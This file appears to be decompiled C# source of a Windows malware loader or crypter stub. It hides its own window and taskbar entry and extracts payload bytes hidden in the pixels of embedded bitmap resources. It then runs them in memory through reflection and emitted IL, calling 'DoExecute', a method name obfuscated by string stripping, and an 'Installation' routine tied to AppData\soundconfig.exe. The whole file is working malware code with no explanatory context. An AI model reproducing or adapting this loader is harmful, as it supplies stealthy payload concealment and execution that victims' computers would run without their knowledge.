using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Reflection.Emit;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

public sealed class Main : Form
{
	public IContainer icontainer_0;

	private Thread thread_0;

	private int int_0;

	private Bitmap bitmap_0;

	private byte[] byte_0;

	private DynamicMethod dynamicMethod_0;

	public Main()
	{
		((Form)this).add_Load((EventHandler)Main_Load);
		Application.EnableVisualStyles();
		method_0();
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(292, 266);
		((Form)this).set_ClientSize(clientSize);
		((Control)this).set_Name("Main");
		((Form)this).set_Text("Main");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[STAThread]
	public static void Main()
	{
		Application.Run((Form)(object)new Main());
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	[DebuggerStepThrough]
	public void method_0()
	{
	}

	public void method_1()
	{
		((Control)this).Hide();
		((Form)this).set_ShowInTaskbar(false);
		Control.set_CheckForIllegalCrossThreadCalls(false);
		thread_0 = new Thread(method_3);
		thread_0.Start();
	}

	private void Main_Load(object sender, EventArgs e)
	{
		method_1();
	}

	public object method_2(byte[] byte_1)
	{
		if (byte_1[60] == 128)
		{
			return true;
		}
		return false;
	}

	public void method_3()
	{
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Expected O, but got Unknown
		//IL_0158: Unknown result type (might be due to invalid IL or missing references)
		//IL_015f: Expected O, but got Unknown
		//IL_01fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0203: Expected O, but got Unknown
		string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\soundconfig.exe";
		ResourceManager resourceManager = new ResourceManager("jYVPheCXvCx", Assembly.GetExecutingAssembly());
		int_0 = Conversions.ToInteger(resourceManager.GetObject("ImageCount"));
		bitmap_0 = (Bitmap)resourceManager.GetObject("ImageDLL1");
		byte_0 = method_5(bitmap_0);
		dynamicMethod_0 = new DynamicMethod("YOLO", typeof(object), new Type[4]
		{
			typeof(byte[]),
			typeof(object[]),
			typeof(string),
			typeof(string)
		});
		string text = "AAAAAAKKKKKKKKKKKKKÅKKKKKKKKKKCCCCCCCCCC";
		string text2 = "AAAAAAKKKKKKKKKKKKKKKKÓKKKKKKKCCCCCCCCCC";
		string text3 = text.Replace("A", string.Empty);
		string text4 = text3.Replace("K", string.Empty);
		string text5 = text4.Replace("C", string.Empty);
		string text6 = text2.Replace("A", string.Empty);
		string text7 = text6.Replace("K", string.Empty);
		string text8 = text7.Replace("C", string.Empty);
		string string_ = "Module1";
		if (File.Exists(path))
		{
			Bitmap bitmap_ = (Bitmap)resourceManager.GetObject("Image0");
			byte[] array = method_5(bitmap_);
			if (Operators.ConditionalCompareObjectEqual(method_2(array), (object)true, false))
			{
				method_4(byte_0, new object[1] { array }, string_, "DoExecute");
			}
			else
			{
				method_4(byte_0, new object[1] { array }, string_, text5 + text8);
			}
		}
		else
		{
			int num = int_0;
			for (int i = 0; i <= num; i = checked(i + 1))
			{
				try
				{
					Bitmap bitmap_2 = (Bitmap)resourceManager.GetObject("Image" + i);
					byte[] array2 = method_5(bitmap_2);
					if (Operators.ConditionalCompareObjectEqual(method_2(array2), (object)true, false))
					{
						method_4(byte_0, new object[1] { array2 }, string_, "DoExecute");
					}
					else
					{
						method_4(byte_0, new object[1] { array2 }, string_, text5 + text8);
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			File.Exists(path);
			method_4(byte_0, new object[1] { Assembly.GetExecutingAssembly().Location }, "Module1", "Installation");
		}
		((Form)this).Close();
	}

	public object method_4(byte[] byte_1, object[] object_0, string string_0, string string_1)
	{
		object iLGenerator = dynamicMethod_0.GetILGenerator();
		object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(iLGenerator, (Type)null, "DefineLabel", new object[0], (string[])null, (Type[])null, (bool[])null));
		NewLateBinding.LateCall(iLGenerator, (Type)null, "DeclareLocal", new object[1] { typeof(Assembly) }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(iLGenerator, (Type)null, "Emit", new object[1] { OpCodes.Ldarg_0 }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(iLGenerator, (Type)null, "EmitCall", new object[3]
		{
			OpCodes.Call,
			typeof(Assembly).GetMethod("Load", new Type[1] { typeof(byte[]) }),
			null
		}, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(iLGenerator, (Type)null, "Emit", new object[1] { OpCodes.Stloc_0 }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(iLGenerator, (Type)null, "Emit", new object[1] { OpCodes.Ldarg_2 }, (string[])null, (Type[])null, (bool[])null, true);
		object[] array = new object[2]
		{
			OpCodes.Brfalse_S,
			RuntimeHelpers.GetObjectValue(objectValue)
		};
		object[] array2 = array;
		bool[] array3 = new bool[2] { false, true };
		NewLateBinding.LateCall(iLGenerator, (Type)null, "Emit", array2, (string[])null, (Type[])null, array3, true);
		if (array3[1])
		{
			objectValue = RuntimeHelpers.GetObjectValue(array[1]);
		}
		NewLateBinding.LateCall(iLGenerator, (Type)null, "Emit", new object[1] { OpCodes.Ldarg_3 }, (string[])null, (Type[])null, (bool[])null, true);
		object[] array4 = new object[2]
		{
			OpCodes.Brfalse_S,
			RuntimeHelpers.GetObjectValue(objectValue)
		};
		object[] array5 = array4;
		array3 = new bool[2] { false, true };
		NewLateBinding.LateCall(iLGenerator, (Type)null, "Emit", array5, (string[])null, (Type[])null, array3, true);
		if (array3[1])
		{
			objectValue = RuntimeHelpers.GetObjectValue(array4[1]);
		}
		NewLateBinding.LateCall(iLGenerator, (Type)null, "Emit", new object[1] { OpCodes.Ldloc_0 }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(iLGenerator, (Type)null, "Emit", new object[1] { OpCodes.Ldarg_2 }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(iLGenerator, (Type)null, "EmitCall", new object[3]
		{
			OpCodes.Callvirt,
			typeof(Assembly).GetMethod("GetType", new Type[1] { typeof(string) }),
			null
		}, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(iLGenerator, (Type)null, "Emit", new object[1] { OpCodes.Ldarg_3 }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(iLGenerator, (Type)null, "EmitCall", new object[3]
		{
			OpCodes.Callvirt,
			typeof(Type).GetMethod("GetMethod", new Type[1] { typeof(string) }),
			null
		}, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(iLGenerator, (Type)null, "Emit", new object[1] { OpCodes.Ldnull }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(iLGenerator, (Type)null, "Emit", new object[1] { OpCodes.Ldarg_1 }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(iLGenerator, (Type)null, "EmitCall", new object[3]
		{
			OpCodes.Callvirt,
			typeof(MethodBase).GetMethod("Invoke", new Type[2]
			{
				typeof(object),
				typeof(object[])
			}),
			null
		}, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(iLGenerator, (Type)null, "Emit", new object[1] { OpCodes.Ret }, (string[])null, (Type[])null, (bool[])null, true);
		array4 = new object[1] { RuntimeHelpers.GetObjectValue(objectValue) };
		object[] array6 = array4;
		array3 = new bool[1] { true };
		NewLateBinding.LateCall(iLGenerator, (Type)null, "MarkLabel", array6, (string[])null, (Type[])null, array3, true);
		if (array3[0])
		{
			objectValue = RuntimeHelpers.GetObjectValue(array4[0]);
		}
		NewLateBinding.LateCall(iLGenerator, (Type)null, "Emit", new object[1] { OpCodes.Ldloc_0 }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(iLGenerator, (Type)null, "EmitCall", new object[3]
		{
			OpCodes.Callvirt,
			typeof(Assembly).GetProperty("EntryPoint")!.GetGetMethod(),
			null
		}, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(iLGenerator, (Type)null, "Emit", new object[1] { OpCodes.Ldnull }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(iLGenerator, (Type)null, "Emit", new object[1] { OpCodes.Ldarg_1 }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(iLGenerator, (Type)null, "EmitCall", new object[3]
		{
			OpCodes.Callvirt,
			typeof(MethodBase).GetMethod("Invoke", new Type[2]
			{
				typeof(object),
				typeof(object[])
			}),
			null
		}, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(iLGenerator, (Type)null, "Emit", new object[1] { OpCodes.Ret }, (string[])null, (Type[])null, (bool[])null, true);
		return dynamicMethod_0.Invoke(null, new object[4] { byte_1, object_0, string_0, string_1 });
	}

	public byte[] method_5(Bitmap bitmap_1)
	{
		List<byte> list = new List<byte>();
		checked
		{
			int num = ((Image)bitmap_1).get_Width() - 1;
			for (int i = 0; i <= num; i++)
			{
				int num2 = ((Image)bitmap_1).get_Height() - 1;
				for (int j = 0; j <= num2; j++)
				{
					Color pixel = bitmap_1.GetPixel(i, j);
					if (pixel != Color.FromArgb(0, 0, 0, 0))
					{
						list.Add(pixel.R);
						list.Add(pixel.G);
						list.Add(pixel.B);
					}
				}
			}
			return list.ToArray();
		}
	}
}
